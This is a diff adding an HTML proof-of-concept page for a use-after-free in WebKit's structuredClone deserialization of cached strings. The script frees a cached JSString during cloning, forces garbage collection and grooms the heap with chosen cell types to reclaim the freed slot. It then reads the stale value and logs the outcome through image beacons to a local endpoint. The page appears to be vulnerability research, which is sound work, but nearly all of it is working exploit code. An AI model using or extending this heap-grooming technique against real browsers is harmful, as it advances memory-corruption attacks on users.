@@ -1,0 +1,91 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CachedString: which cell class can take the freed JSString</title>
+<body>
+<script>
+// docs/76. structuredClone's CloneDeserializer::CachedString keeps a raw JSValue m_jsString
+// (SerializedScriptValue.cpp:2825-2837) with no keep-alive. This page frees the cached JSString inside one
+// deserialization by overwriting the map entry that holds it, forces GC from a large ArrayBuffer later in the
+// same stream, and then reads the same string again through a pool reference.
+//
+// The knob that matters is `flood`: which *cell class* is allocated between the sweep and the reuse.
+//   none -> nothing in the window (the cell stays on stringSpace's free list)
+//   str  -> 16-byte JSString cells      (stringSpace, IsoSubspace)
+//   obj  -> 16-byte JSFinalObject cells (vm.cellSpace, CompleteSubspace: same size class, other subspace)
+//   arr  -> arrays (different size class: allocation control)
+// The read of r.get('expected') and the three field probes (typeof / length / charCodeAt(0)) are the first JS
+// statements after the clone, so no page-side string allocation can take the slot before they run.
+(function () {
+  var Q = new URLSearchParams(location.search);
+  function K(k, d) { return Q.has(k) ? Q.get(k) : d; }
+  function B(m) { try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)); } catch (e) {} }
+
+  var FLOOD = K('flood', 'none');
+  var N = parseInt(K('n', '64'), 10);
+  var BUFMB = parseInt(K('buf', '16'), 10);
+  var NBUF = parseInt(K('nbuf', '4'), 10);
+  var FREEK = K('freek', '1') === '1';
+  var ORDER = K('order', 'post');   // post: flood after the buffers (inside the window) | pre: before them
+  var PRE = K('pre', 'none');       // lit: allocate a 16-byte {} literal right after the clone, before the read
+  B('boot flood=' + FLOOD + ' n=' + N + ' order=' + ORDER + ' buf=' + BUFMB + ' nbuf=' + NBUF + ' freek=' + FREEK + ' pre=' + PRE);
+
+  var S = 'Expected result';
+  var map = new Map();
+  map.set('free', S);        // pool: 'free'=0, S=1
+  map.set('expected', 0);    // pool: 'expected'=2  (so the later re-add is a pool ref, no JSString)
+  map.set('tmp', { get a () {
+      map.delete('free');
+      if (FREEK) map.set('free', 0x1234);   // J_S loses its only root here; the next GC sweeps it
+      map.delete('expected');               // re-added below, after the window
+      var arr = [];
+      var addFlood = function () {
+        if (FLOOD === 'str') { for (var j = 0; j < N; j++) arr.push('FL' + (1000 + j)); }
+        else if (FLOOD === 'obj') { for (var j = 0; j < N; j++) arr.push({}); }
+        else if (FLOOD === 'arr') { for (var j = 0; j < N; j++) arr.push([j]); }
+      };
+      if (ORDER === 'pre') addFlood();
+      for (var i = 0; i < NBUF; i++) arr.push(new ArrayBuffer(BUFMB * 1024 * 1024)); // GC inside the window
+      if (ORDER !== 'pre') addFlood();
+      map.set(7, arr);                      // numeric key: no JSString allocated before the value
+      map.set('expected', S);               // pool ref 1 -> the stale m_jsString
+      return 1;
+  }});
+
+  B('pre');
+  var r;
+  try { r = structuredClone(map); } catch (e) { B('THREW ' + e.name); return; }
+
+  // pre=lit: allocate a 16-byte JSFinalObject (a `{}` literal has inlineCapacity 0, so allocationSize(0) ==
+  // sizeof(JSObject) == 16) in vm.cellSpace, the generic size-class subspace, BEFORE the stale value is read.
+  // This is the same-size-class / different-subspace probe that the deserializer cannot provide: an ObjectTag
+  // from the stream is built with constructEmptyObject(global, prototype) -> defaultInlineCapacity -> 64 bytes.
+  if (PRE === 'lit') { try { window.__lit = {}; } catch (e) {} }
+
+  // First statements after the clone: read the stale value and its fields before this page allocates any
+  // string of its own (a beacon that concatenates numbers still allocates, so the numbers come first).
+  // probe=eq  : compare first (asString path, trips the oracle's jsCast security assert on a zapped cell)
+  // probe=len : read the length first (dereferences m_value directly: shows the address in a SEGV report)
+  var PROBE = K('probe', 'eq');
+  var got, t, L, C, same;
+  try {
+    got = r.get('expected');
+    t = typeof got;
+    if (PROBE === 'len') {
+      try { L = got.length; } catch (e) { L = 'throw'; }
+      try { C = got.charCodeAt ? got.charCodeAt(0) : 'nofn'; } catch (e) { C = 'throw'; }
+      same = (got === S);
+    } else {
+      same = (got === S);
+      try { L = got.length; } catch (e) { L = 'throw'; }
+      try { C = got.charCodeAt ? got.charCodeAt(0) : 'nofn'; } catch (e) { C = 'throw'; }
+    }
+  } catch (e) { B('GET_THREW ' + e.name); return; }
+
+  var idSame = false, tn = 'n/a', t0 = 'n/a', alen = -1, v = 'n/a';
+  try { var arr = r.get(7); alen = arr.length; tn = typeof arr[NBUF]; t0 = typeof arr[0]; idSame = (got === arr[NBUF]); } catch (e) {}
+  try { v = String(got).slice(0, 12); } catch (e) { v = 'throw'; }
+  B('SUM len=' + alen + ' t0=' + t0 + ' tN=' + tn);
+  B('RESULT typeof=' + t + ' same=' + same + ' idSame=' + idSame + ' L=' + L + ' C=' + C + ' v=' + v);
+  B('DONE');
+})();
+</script>
